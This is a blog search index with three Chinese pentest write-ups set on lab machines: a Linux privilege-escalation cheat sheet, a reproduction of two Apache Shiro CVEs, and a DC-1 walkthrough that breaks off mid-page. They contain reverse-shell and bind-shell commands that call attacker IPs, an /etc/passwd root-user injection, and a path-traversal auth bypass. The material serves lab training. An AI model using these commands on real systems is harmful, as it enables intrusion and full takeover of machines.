<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Linux渗透提权姿势总结</title>
      <link href="/Water-melon.github.io/2024/09/30/Linux%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/"/>
      <url>/Water-melon.github.io/2024/09/30/Linux%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="Linux渗透提权姿势总结"><a href="#Linux渗透提权姿势总结" class="headerlink" title="Linux渗透提权姿势总结"></a>Linux渗透提权姿势总结</h1><h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>在做过不少Linux的靶机渗透后，几乎每一个靶机获取最后一个flag都是需要提权，在root权限下肆无忌惮查看所有文件。在实战中，一次成功的渗透往往也是以拿下最高权限作为完美的结尾，至此，我将打了多个靶机以来所用到的提权方式做一个总结，各位师傅若有补充，欢迎评论留言。</p><h2 id="suid提权"><a href="#suid提权" class="headerlink" title="suid提权"></a>suid提权</h2><h2 id="SUID是什么？"><a href="#SUID是什么？" class="headerlink" title="SUID是什么？"></a>SUID是什么？</h2><p>SUID是Linux系统中的一个特殊权限，它允许文件在执行时，让调用者以文件拥有者的身份运行该文件。这意味着，当一个具有SUID权限的文件被执行时，它会授予调用者与文件拥有者相同的权限，使得调用者能够以文件拥有者的权限来执行文件中的命令和程序。在执行过程中，调用者会暂时获得该文件的所有者权限,且该权限只在程序执行的过程中有效。</p><h2 id="SUID如何实现提权？"><a href="#SUID如何实现提权？" class="headerlink" title="SUID如何实现提权？"></a>SUID如何实现提权？</h2><p>举个例子吧，假设我们现在有一个可执行文件test，其属主为root用户，当我们通过非root用户登录时，如果test设置了SUID权限，我们可在非root用户下运行该二进制可执行文件，在执行文件时，该进程的权限将为root权限。以此得到权限提升。</p><p>为一个文件设置SUID权限：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chmod u+s filename   #设置SUID位</span><br><span class="line"> </span><br><span class="line">chmod u-s filename   #去掉SUID设置</span><br></pre></td></tr></table></figure><p>这里有一个文件<br><img src="/Water-melon.github.io/2024/09/30/Linux%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/1.png" alt="1"><br>当没有SUID权限时，为drwxr-xr-x<br><img src="/Water-melon.github.io/2024/09/30/Linux%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/2.png" alt="2"><br>当拥有SUID权限时，为drwsr-xr-x</p><h2 id="find"><a href="#find" class="headerlink" title="find"></a>find</h2><p>find比较常用,find用来在系统中查找文件。同时，它也有执行命令的能力。 因此，如果配置为使用SUID权限运行，则可以通过find执行的命令都将以root身份去运行。</p><p>利用find命令，找查具有SUID权限的可执行二进制文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line"> </span><br><span class="line">find / -perm -4000 -print 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p>一般有find，nmap，vim&#x2F;vi，bash，less，more，nano，cp，awk就可以进行下一步操作提权。<br><code>find: find / -name index.php -exec &quot;/bin/sh&quot;；#找什么文件不重要，只要有就可以</code></p><h2 id="find也可以用来弹shell"><a href="#find也可以用来弹shell" class="headerlink" title="find也可以用来弹shell"></a>find也可以用来弹shell</h2><h2 id="广播shell"><a href="#广播shell" class="headerlink" title="广播shell"></a>广播shell</h2><p>靶机：<br><code>find user -exec nc -lvp 4444 -e &#39;/bin/sh&#39; \;</code><br>攻击机：<br><code>nc 靶机ip 4444</code></p><h2 id="vim"><a href="#vim" class="headerlink" title="vim"></a>vim</h2><p>vim的主要用途是做编辑器,是，如果以SUID运行，它将继承root用户的权限，因此可以读取系统上的所有文件。</p><p>如：vim.tiny  &#x2F;etc&#x2F;passwd</p><p>也可以编写shell</p><p>vim.tiny</p><p>#vim命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">:set shell = &#x27;/bin/sh&#x27;</span><br><span class="line"> </span><br><span class="line">:shell</span><br></pre></td></tr></table></figure><h2 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h2><p>用root身份打开一个新的bash shell</p><p>bash -p</p><p>bash-3.2# id</p><p>uid&#x3D;1002(service) gid&#x3D;1002(service) euid&#x3D;0(root) groups&#x3D;1002(service)</p><h2 id="less"><a href="#less" class="headerlink" title="less"></a>less</h2><p>less命令也可以进入shell</p><p>less &#x2F;etc&#x2F;passwd</p><p>#在less中输入:</p><p>!&#x2F;bin&#x2F;sh</p><h2 id="more"><a href="#more" class="headerlink" title="more"></a>more</h2><p>使用more和less一定读取一个比较大的文件,如果文件太小无法进入翻页功能也就无法使用!命令进入shell</p><p>more &#x2F;etc&#x2F;passwd</p><p>#在more中输入:</p><p>!&#x2F;bin&#x2F;sh</p><h2 id="nano"><a href="#nano" class="headerlink" title="nano"></a>nano</h2><p>进入shell:</p><p>nano #进入nano编辑器</p><p>Ctrl + R</p><p>Ctrl + X</p><p>#即可输入命令</p><h2 id="cp"><a href="#cp" class="headerlink" title="cp"></a>cp</h2><p>使用cp 命令覆盖原来的&#x2F;etc&#x2F;passwd文件</p><h2 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h2><p>进入shell</p><p>awk ‘BEGIN {system(“&#x2F;bin&#x2F;bash”)}’</p><h1 id="rbash逃逸"><a href="#rbash逃逸" class="headerlink" title="rbash逃逸"></a>rbash逃逸</h1><p>参考： <a href="https://blog.csdn.net/qq_43168364/article/details/111830233">https://blog.csdn.net/qq_43168364/article/details/111830233</a><br>rbash它与一般shell的区别在于会限制一些行为，让一些命令无法执行</p><p>设置一个rbash</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cp /bin/bash /bin/rbash # 复制一个bash，重命名为rbash</span><br><span class="line"> </span><br><span class="line">useradd -s /bin/rbash test # 设置用户test登陆的shell为rbash</span><br><span class="line"> </span><br><span class="line">mkdir -p /home/test/.bin # 在test用户下新建一个.bin目录存放可以执行的命令</span><br></pre></td></tr></table></figure><h2 id="set-shell"><a href="#set-shell" class="headerlink" title="set shell"></a>set shell</h2><p>即利用编辑器添加一个shell变量并执行</p><p>命令：<br><code>vi/vim</code><br>进入之后再输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">:set shell=/bin/sh # 或者用/bin/bash</span><br><span class="line"> </span><br><span class="line">:shell</span><br></pre></td></tr></table></figure><p>注意，在这之后还要添加环境变量。</p><p>给$PATH变量增加两个路径，用来查找命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export PATH=$PATH:/bin/</span><br><span class="line"> </span><br><span class="line">export PATH=$PATH:/usr/bin/</span><br></pre></td></tr></table></figure><p>成功案列可参考：<br>内网渗透：DC-2靶机</p><h2 id="自定义shell"><a href="#自定义shell" class="headerlink" title="自定义shell"></a>自定义shell</h2><p>利用bash_cmds自定义一个shell，以此达到提权的目的</p><p>命令：<br><code>BASH_CMDS[a]=/bin/sh;a </code><br>和set shell一样，这个也需要添加环境变量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export PATH=$PATH:/bin/</span><br><span class="line"> </span><br><span class="line">export PATH=$PATH:/usr/bin&#125;</span><br></pre></td></tr></table></figure><p>成功案列可参考：<br>内网渗透：DC-2靶机</p><h2 id="Git提权"><a href="#Git提权" class="headerlink" title="Git提权"></a>Git提权</h2><p>注意：这里的git是拥有root权限的git，也就是sudo -l查找下的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo git help config</span><br><span class="line">!/bin/bash  #这里bash也可以换成sh</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo git -p help</span><br><span class="line">!/bin/bash  #这里bash也可以换成sh</span><br></pre></td></tr></table></figure><h2 id="teehee"><a href="#teehee" class="headerlink" title="teehee"></a>teehee</h2><p>在了解teehee之前，我们先来了解一下&#x2F;etc&#x2F;passwd文件<br>参考：<a href="https://blog.csdn.net/liukaitydn/article/details/83046083">https://blog.csdn.net/liukaitydn/article/details/83046083</a><br>简而言之，就是存放用户的文件，可以通过修改该文件达到添加用户的效果，文件格式为</p><h3 id="注册名-口令-用户标识号-组标识号-用户名-用户主目录-命令解析程序"><a href="#注册名-口令-用户标识号-组标识号-用户名-用户主目录-命令解析程序" class="headerlink" title="[注册名]:[口令]:[用户标识号]:[组标识号]:[用户名]:[用户主目录]:[命令解析程序]"></a>[注册名]:[口令]:[用户标识号]:[组标识号]:[用户名]:[用户主目录]:[命令解析程序]</h3><p>口令为x即代表存放有密码，为空即代表没有密码，识标号为0代表root权限</p><p>因此写入：</p><p>echo “test::0:0:::&#x2F;bin&#x2F;bash” | sudo teehee -a &#x2F;etc&#x2F;passwd  </p><h3 id="就相当于添加了一个名叫test的无密码root权限用户"><a href="#就相当于添加了一个名叫test的无密码root权限用户" class="headerlink" title="就相当于添加了一个名叫test的无密码root权限用户"></a>就相当于添加了一个名叫test的无密码root权限用户</h3><h2 id="screen"><a href="#screen" class="headerlink" title="screen"></a>screen</h2><p>利用exp提权</p><p>searchsploit screen 4，找到对应版本漏洞进行攻击</p><h1 id="反弹root-shell"><a href="#反弹root-shell" class="headerlink" title="反弹root shell"></a>反弹root shell</h1><p>利用拥有root权限的文件<br><code>echo &quot;nc -e /bin/bash 192.168.120.129 5555&quot; &gt;&gt; /opt/scripts/backups.sh</code><br>若有错处，欢迎指正</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Shiro漏洞复现</title>
      <link href="/Water-melon.github.io/2024/09/30/Shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/Water-melon.github.io/2024/09/30/Shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="Shiro漏洞复现"><a href="#Shiro漏洞复现" class="headerlink" title="Shiro漏洞复现"></a>Shiro漏洞复现</h1><h2 id="1——关于Shiro漏洞原理和（反）序列化"><a href="#1——关于Shiro漏洞原理和（反）序列化" class="headerlink" title="1——关于Shiro漏洞原理和（反）序列化"></a>1——关于Shiro漏洞原理和（反）序列化</h2><h2 id="2——利用docker进行vulhub靶场搭建"><a href="#2——利用docker进行vulhub靶场搭建" class="headerlink" title="2——利用docker进行vulhub靶场搭建"></a>2——利用docker进行vulhub靶场搭建</h2><h2 id="3——漏洞复现（CVE-2016-4437）"><a href="#3——漏洞复现（CVE-2016-4437）" class="headerlink" title="3——漏洞复现（CVE-2016-4437）"></a>3——漏洞复现（CVE-2016-4437）</h2><h2 id="4——Shiro结合spring实现权限绕过漏洞（CVE-2020-1957）"><a href="#4——Shiro结合spring实现权限绕过漏洞（CVE-2020-1957）" class="headerlink" title="4——Shiro结合spring实现权限绕过漏洞（CVE-2020-1957）"></a>4——Shiro结合spring实现权限绕过漏洞（CVE-2020-1957）</h2><h2 id="1-1-shiro"><a href="#1-1-shiro" class="headerlink" title="1-1 shiro"></a>1-1 shiro</h2><p>Apache Shiro是一个强大且易用的Java安全框架,执行身份验证、授权、密码和会话管理。使用Shiro的易于理解的API,您可以快速、轻松地获得任何应用程序,从最小的移动应用程序到最大的网络和企业应用程序。</p><h2 id="1-2-序列化"><a href="#1-2-序列化" class="headerlink" title="1-2 序列化"></a>1-2 序列化</h2><p>序列化就是为了传输遍历，把一个对象类型的数据转换成字符串进行传输；比如javascript里的一个对象{name:’aini’,age:22}可以通过JSON.stringify函数转换成一个JSON格式的字符串，便于传输既这个对象会变成’{“name”:”aini”,”age”:18}’，或者在PHP语言里面把一个类或者对象，或者函数等通过serialize函数进行序列化便于传输；序列化后产生的JSON，或者XML格式不仅传输便利，而且可以跨语言传输数据，这个把某个对象序列化成json格式或者XML格式或者其他序列化格式的字符串过程称为序列化；不过值得注意的是序列化不仅仅是这一种方式，还有对象数据类型转换成XML格式等，可以自行百度一下；</p><h2 id="1-3-反序列化"><a href="#1-3-反序列化" class="headerlink" title="1-3 反序列化"></a>1-3 反序列化</h2><p>反序列化就是序列化的逆向过程，把一个序列化的JSON字符串内容或者XML内容反向还原回序列化前的对象格式</p><h2 id="1-4-漏洞原理"><a href="#1-4-漏洞原理" class="headerlink" title="1-4 漏洞原理"></a>1-4 漏洞原理</h2><p>在Apache shiro的框架中，执行身份验证时提供了一个记住密码的功能（RememberMe），如果用户登录时勾选了这个选项。用户的请求数据包中将会在cookie字段多出一段数据，这一段数据包含了用户的身份信息，且是经过加密的。加密的过程是：用户信息&#x3D;&gt;序列化&#x3D;&gt;AES加密（这一步需要用密钥key）&#x3D;&gt;base64编码&#x3D;&gt;添加到RememberMe Cookie字段。勾选记住密码之后，下次登录时，服务端会根据客户端请求包中的cookie值进行身份验证，无需登录即可访问。那么显然，服务端进行对cookie进行验证的步骤就是：取出请求包中rememberMe的cookie值 &#x3D;&gt; Base64解码&#x3D;&gt;AES解密（用到密钥key）&#x3D;&gt;反序列化。</p><h2 id="1-5-漏洞利用思路"><a href="#1-5-漏洞利用思路" class="headerlink" title="1-5 漏洞利用思路"></a>1-5 漏洞利用思路</h2><p>既然能进行序列化，那我们可以对我们自己的攻击代码进行相同的AES加密，base64编码以后产生rememberMe字段发给服务端，服务端反向进行解密得到我们攻击代码并会运行，进而我们就攻击成功了</p><h2 id="2-1-Vulhub靶场环境搭建"><a href="#2-1-Vulhub靶场环境搭建" class="headerlink" title="2-1 Vulhub靶场环境搭建"></a>2-1 Vulhub靶场环境搭建</h2><h3 id="1-更新安装列表"><a href="#1-更新安装列表" class="headerlink" title="1.更新安装列表"></a>1.更新安装列表</h3><p><code>sudo apt-get update</code><br><img src="/Water-melon.github.io/2024/09/30/Shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1.png" alt="1"></p><h3 id="2-查看docker安装版本"><a href="#2-查看docker安装版本" class="headerlink" title="2.查看docker安装版本"></a>2.查看docker安装版本</h3><p><code>docker -v</code><br><img src="/Water-melon.github.io/2024/09/30/Shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2.png" alt="2"></p><h3 id="3-检查pip是否安装"><a href="#3-检查pip是否安装" class="headerlink" title="3.检查pip是否安装"></a>3.检查pip是否安装</h3><p><code>pip -V</code><br><img src="/Water-melon.github.io/2024/09/30/Shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/3.png" alt="3"></p><h3 id="4-查看docker-compose是否安装成功"><a href="#4-查看docker-compose是否安装成功" class="headerlink" title="4.查看docker-compose是否安装成功"></a>4.查看docker-compose是否安装成功</h3><p><code>docker-compose -v</code><br><img src="/Water-melon.github.io/2024/09/30/Shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/4.png" alt="4"></p><h3 id="5-Vulhub靶场的安装与启动"><a href="#5-Vulhub靶场的安装与启动" class="headerlink" title="5.Vulhub靶场的安装与启动"></a>5.Vulhub靶场的安装与启动</h3><p>下载靶场环境，我这边是放在了&#x2F;home&#x2F;xiaoxigua&#x2F;vulhub下<br><code>git clone https://github.com/vulhub/vulhub.git /home/xiaoxigua/vulhub</code><br><img src="/Water-melon.github.io/2024/09/30/Shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/5.png" alt="5"><br>docker启动靶场环境<br>安装完毕后cd进入到&#x2F;home&#x2F;xiaoxigua&#x2F;vulhub文件夹下<br><img src="/Water-melon.github.io/2024/09/30/Shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/6.png" alt="6"><br>进入对应目录下，使用以下命令启动该漏洞靶场环境</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd shiro</span><br><span class="line">cd CVE-2016-4437</span><br><span class="line">docker-compose up -d （运行靶场）</span><br></pre></td></tr></table></figure><p><img src="/Water-melon.github.io/2024/09/30/Shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/7.png" alt="7"><br><code>docker ps （查看容器列表）</code><br><img src="/Water-melon.github.io/2024/09/30/Shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/8.png" alt="8"><br>浏览器直接访问，发现已经成功运行（ip为运行docker服务器的ip）<br><img src="/Water-melon.github.io/2024/09/30/Shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/9.png" alt="9"></p><h2 id="3-1-漏洞复现"><a href="#3-1-漏洞复现" class="headerlink" title="3-1 漏洞复现"></a>3-1 漏洞复现</h2><p>随便输入用户名和密码进行抓包，放到重放器里面，点击发送，相应包里看到rememberMe &#x3D; deleteMe字段，可以说应该存在这个shiro550反序列化漏洞<br><img src="/Water-melon.github.io/2024/09/30/Shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/10.png" alt="10"></p><h2 id="3-2-复现工具"><a href="#3-2-复现工具" class="headerlink" title="3-2 复现工具"></a>3-2 复现工具</h2><h3 id="3-2-1-burp插件："><a href="#3-2-1-burp插件：" class="headerlink" title="3-2-1 burp插件："></a>3-2-1 burp插件：</h3><p>BurpShiroPassiveScan.jar<br>在burp中导入：<br><img src="/Water-melon.github.io/2024/09/30/Shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/11.png" alt="11"><br><img src="/Water-melon.github.io/2024/09/30/Shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/12.png" alt="12"><br>当 Burp 抓到Shiro的数据包时会自动进行检测，当发现存在Shiro默认key时会告警。<br><img src="/Water-melon.github.io/2024/09/30/Shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/13.png" alt="13"><br>从而获取该值。</p><h3 id="3-2-2：shiro-attack工具"><a href="#3-2-2：shiro-attack工具" class="headerlink" title="3-2-2：shiro_attack工具"></a>3-2-2：shiro_attack工具</h3><p>下载链接：<br><a href="https://pan.baidu.com/share/init?surl=snX2gezA0dKWpBFDQ97WzQ&pwd=9tqg">https://pan.baidu.com/share/init?surl=snX2gezA0dKWpBFDQ97WzQ&amp;pwd=9tqg</a><br>结合之前获得的key：<br><img src="/Water-melon.github.io/2024/09/30/Shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/14.png" alt="14"><br>使用上面的工具，爆破出利用链<br><img src="/Water-melon.github.io/2024/09/30/Shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/15.png" alt="15"><br>可以实现反弹shell<br><code>bash -c &#39;exec bash -i &amp;&gt;/dev/tcp/192.168.211.141/7777 &lt;&amp;1&#39;</code><br><img src="/Water-melon.github.io/2024/09/30/Shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/16.png" alt="16"><br>在kali进行监听：<br><img src="/Water-melon.github.io/2024/09/30/Shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/17.png" alt="17"><br>成功反弹shell<br><img src="/Water-melon.github.io/2024/09/30/Shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/18.png" alt="18"><br><img src="/Water-melon.github.io/2024/09/30/Shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/19.png" alt="19"></p><h2 id="4——Shiro结合spring实现权限绕过漏洞（CVE-2020-1957）-1"><a href="#4——Shiro结合spring实现权限绕过漏洞（CVE-2020-1957）-1" class="headerlink" title="4——Shiro结合spring实现权限绕过漏洞（CVE-2020-1957）"></a>4——Shiro结合spring实现权限绕过漏洞（CVE-2020-1957）</h2><h2 id="4-1"><a href="#4-1" class="headerlink" title="4-1"></a>4-1</h2><p>在 Apache Shiro 1.5.2 以前的版本中，在使用Spring动态控制器时，攻击者通过构造..;这样的跳转，可以绕过Shiro中对目录的权限限制。<br>漏洞原理：<br>Shiro框架使用拦截器对用户访问权限进行控制，常见的有如anon、authc等拦截器。<br>    anon拦截器为匿名拦截器，无需登陆即可进行访问，一般用于静态资源。<br>    authc为登陆拦截器，需要登陆才可以访问。<br>shiro会以分号将传入的URI进行截断，并将分号以及分号后面的数据进行清空，返回分号前面的URI数据，如：<br>&#x2F;a&#x2F;b;&#x2F;c处理后变为&#x2F;a&#x2F;b<br>Spring对于分号的处理方式与Shiro不同，Spring会先获取分号的位置，并检测分号后是否存在&#x2F;，如果有，将&#x2F;的位置记录在slashIndex变量中，并将分号前的数据与&#x2F;之后的数据进行拼接，如：<br>&#x2F;a&#x2F;b;&#x2F;c处理后变为&#x2F;a&#x2F;b&#x2F;c。<br>返回处理后的requestURI。<br>由于Spring与Shiro的decodeAndCleanUriString方法不同，攻击者可以使用分号构造路径，绕过Shiro认证，并可以匹配Spring的动态控制器。<br>即URL请求过程：<br>客户端请求URL: &#x2F;xxx&#x2F;..;&#x2F;admin&#x2F;<br>Shrio内部处理得到校验URL为 &#x2F;xxx&#x2F;..，校验通过。<br>SpringBoot 处理 &#x2F;xxx&#x2F;..;&#x2F;admin&#x2F;，最终请求 &#x2F;admin&#x2F;，成功访问了后台请求。<br>影响版本：Shiro &lt; 1.5.3</p><h2 id="4-2-搭建环境进行测试"><a href="#4-2-搭建环境进行测试" class="headerlink" title="4-2 搭建环境进行测试"></a>4-2 搭建环境进行测试</h2><p>vulhub&#x2F;shiro&#x2F;CVE-2020-1957<br><img src="/Water-melon.github.io/2024/09/30/Shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20.png" alt="20"><br><img src="/Water-melon.github.io/2024/09/30/Shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/21.png" alt="21"><br>此时访问&#x2F;admin&#x2F;会显示302<br><img src="/Water-melon.github.io/2024/09/30/Shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/22.png" alt="22"><br>构造恶意链接：<br>&#x2F;xxx&#x2F;..;&#x2F;admin&#x2F;<br><img src="/Water-melon.github.io/2024/09/30/Shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/23.png" alt="23"><br>成功绕过！<br><img src="/Water-melon.github.io/2024/09/30/Shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/24.png" alt="24"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>内网渗透：DC-1靶机</title>
      <link href="/Water-melon.github.io/2024/09/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%EF%BC%9ADC-1%E9%9D%B6%E6%9C%BA/"/>
      <url>/Water-melon.github.io/2024/09/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%EF%BC%9ADC-1%E9%9D%B6%E6%9C%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="渗透环境"><a href="#渗透环境" class="headerlink" title="渗透环境"></a>渗透环境</h1><h3 id="攻击机Kali（Linux）-IP：192-168-211-1"><a href="#攻击机Kali（Linux）-IP：192-168-211-1" class="headerlink" title="攻击机Kali（Linux） IP：192.168.211.1"></a>攻击机Kali（Linux） IP：192.168.211.1</h3><h3 id="靶机：DC-1-ovk（Linux）-IP：未知"><a href="#靶机：DC-1-ovk（Linux）-IP：未知" class="headerlink" title="靶机：DC-1.ovk（Linux）  IP：未知"></a>靶机：DC-1.ovk（Linux）  IP：未知</h3><h3 id="首先导入DC-1靶机到VM中，并且开启靶机"><a href="#首先导入DC-1靶机到VM中，并且开启靶机" class="headerlink" title="首先导入DC-1靶机到VM中，并且开启靶机"></a>首先导入DC-1靶机到VM中，并且开启靶机</h3><h3 id="将靶机与攻击机设置在同一网段下，这样靶机才能被攻击机扫描到，可以同时设置为桥接或者NAT模式。"><a href="#将靶机与攻击机设置在同一网段下，这样靶机才能被攻击机扫描到，可以同时设置为桥接或者NAT模式。" class="headerlink" title="将靶机与攻击机设置在同一网段下，这样靶机才能被攻击机扫描到，可以同时设置为桥接或者NAT模式。"></a>将靶机与攻击机设置在同一网段下，这样靶机才能被攻击机扫描到，可以同时设置为桥接或者NAT模式。</h3><h1 id="一、检测同一网段下的IP"><a href="#一、检测同一网段下的IP" class="headerlink" title="一、检测同一网段下的IP"></a>一、检测同一网段下的IP</h1><h3 id="使用工具arp-scan"><a href="#使用工具arp-scan" class="headerlink" title="使用工具arp-scan"></a>使用工具arp-scan</h3><p> 扫描当前网段所有IP：<br><code>arp-scan -l</code><br><img src="/Water-melon.github.io/2024/09/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%EF%BC%9ADC-1%E9%9D%B6%E6%9C%BA/1.png" alt="1"></p><h3 id="靶机IP：192-168-211-132"><a href="#靶机IP：192-168-211-132" class="headerlink" title="靶机IP：192.168.211.132"></a>靶机IP：192.168.211.132</h3><h1 id="二、探测端口和服务"><a href="#二、探测端口和服务" class="headerlink" title="二、探测端口和服务"></a>二、探测端口和服务</h1><h3 id="使用工具nmap"><a href="#使用工具nmap" class="headerlink" title="使用工具nmap"></a>使用工具nmap</h3><p> 命令：<br><code>nmap -sV -p- 192.168.211.132</code><br><img src="/Water-melon.github.io/2024/09/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%EF%BC%9ADC-1%E9%9D%B6%E6%9C%BA/2.png" alt="2"></p><p>开放的服务有http和ssh，ssh的端口是7744</p><p>去网页访问80端口<br><img src="/Water-melon.github.io/2024/09/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%EF%BC%9ADC-1%E9%9D%B6%E6%9C%BA/3.png" alt="3"><br>会发现显示访问不了。<br>考虑IP未遵循重定向到域名</p><p>用nmap -A 全扫描其实就可以发现这个问题<br><img src="/Water-melon.github.io/2024/09/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%EF%BC%9ADC-1%E9%9D%B6%E6%9C%BA/4.png" alt="4"></p><h3 id="这时候需要设置hosts文件，添加一条"><a href="#这时候需要设置hosts文件，添加一条" class="headerlink" title="这时候需要设置hosts文件，添加一条:"></a>这时候需要设置hosts文件，添加一条:</h3><p><code>192.168.211.132  dc-2</code><br>kali的hosts文件在&#x2F;etc&#x2F;hosts</p><p>用vim打开添加<br><img src="/Water-melon.github.io/2024/09/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%EF%BC%9ADC-1%E9%9D%B6%E6%9C%BA/5.png" alt="5"><br>添加完之后就能访问了</p><p>指纹识别为WordPress框架，这是一个应用广泛的博客框架，迄今为止关于它和它的扩展及插件的漏洞都有不少。但是很可惜，我尝试过用metaspolit进行攻击，没有成功。<br><img src="/Water-melon.github.io/2024/09/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%EF%BC%9ADC-1%E9%9D%B6%E6%9C%BA/6.png" alt="6"></p><h3 id="看到flag1"><a href="#看到flag1" class="headerlink" title="看到flag1"></a>看到flag1</h3><p><img src="/Water-melon.github.io/2024/09/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%EF%BC%9ADC-1%E9%9D%B6%E6%9C%BA/7.png" alt="7"><br>Flag1提示<br><img src="/Water-melon.github.io/2024/09/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%EF%BC%9ADC-1%E9%9D%B6%E6%9C%BA/8.png" alt="8"></p><h2 id="cewl"><a href="#cewl" class="headerlink" title="cewl"></a>cewl</h2><p>cewl是一个字典生成工具<br><img src="/Water-melon.github.io/2024/09/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%EF%BC%9ADC-1%E9%9D%B6%E6%9C%BA/9.png" alt="9"></p><p>Flag1提示我们需要用这个工具生成网站相关的字典，这个字典大概率是密码，但其实我们并没有找到登录的页面，这时候需要用网站目录扫描工具进行扫描Flag1提示我们需要用这个工具生成网站相关的字典，这个字典大概率是密码，但其实我们并没有找到登录的页面，这时候需要用网站目录扫描工具进行扫描</p><p>命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">drsearch -u http://dc-2/ -e * -x 404 403</span><br><span class="line">#-e * 使用所有语言</span><br><span class="line">#-x 不返回的页面 </span><br></pre></td></tr></table></figure><p><img src="/Water-melon.github.io/2024/09/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%EF%BC%9ADC-1%E9%9D%B6%E6%9C%BA/10.png" alt="10"></p><h1 id="三、网页渗透"><a href="#三、网页渗透" class="headerlink" title="三、网页渗透"></a>三、网页渗透</h1><h2 id="找到登录页面"><a href="#找到登录页面" class="headerlink" title="找到登录页面"></a>找到登录页面</h2><p>访问</p><p><img 